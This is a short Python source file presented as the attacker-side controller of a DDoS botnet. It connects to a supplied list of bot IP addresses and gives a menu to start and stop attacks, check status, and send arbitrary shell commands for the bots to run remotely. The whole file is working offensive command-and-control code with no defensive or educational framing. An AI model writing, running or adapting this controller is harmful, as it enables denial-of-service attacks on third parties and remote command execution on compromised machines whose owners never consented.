"""
Description: A simple botnet DDoS control program (attacker)
Author: github.com/h-i-e-u
Version: 1.0
"""

import socket
import os
import argparse

def parse_arguments():
    parser = argparse.ArgumentParser(description='DDoS Botnet Attacker')
    parser.add_argument('-b', '--bots', nargs='+', help='List of bot IP addresses', required=True)
    parser.add_argument('-p', '--port', type=int, default=7777, help='Port number (default: 7777)')
    return parser.parse_args()

def send_command(bot_ip, command):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((bot_ip, PORT))
        except socket.error as e:
            print(f"Error connecting to bot at {bot_ip}:{PORT} - {e}")
            return
        s.sendall(command.encode())
        response = s.recv(1024)
        print(f"Response from {bot_ip}: {response.decode()}")
        return
def send_command_to_all_bots(command):
    for bot_ip in BOT_IP_LIST:
        send_command(bot_ip, command)


def main():
    args = parse_arguments()
    global PORT
    PORT = args.port
    global BOT_IP_LIST 
    BOT_IP_LIST = args.bots


    banner = '''    
        ------------------------
        | DDoS Botnet Attacker |
        ------------------------
    '''
    options = '''
        [1] Start Attack
        [2] Stop Attack (still in development)
        [3] Show Status
        [4] Run whoami (whoami)
        [run:] Custom Command (run:your_command)
        [e]. Exit
    '''


    command_choice = "0"
    while command_choice != "e":
        os.system('cls' if os.name == 'nt' else 'clear')
        print(banner)
        print(options)
        choice = input("Choose an option: ").strip()
        # print(f"You chose: {choice[:3]}")

        if choice == "1":
            send_command_to_all_bots("start_attack")
        elif choice == "2":
            send_command_to_all_bots("stop_attack")
        elif choice == "3":
            send_command_to_all_bots("check")
        elif choice == "4":
            send_command_to_all_bots("run:whoami")
        elif choice[:4] == "run:":
            send_command_to_all_bots(f"{choice}")  
        elif choice == "e":
            print("Exiting...")
            break
        else:
            print("Invalid choice.")
        input("\nPress Enter to continue...")


# main function to run the attacker script
if __name__ == "__main__":
    main()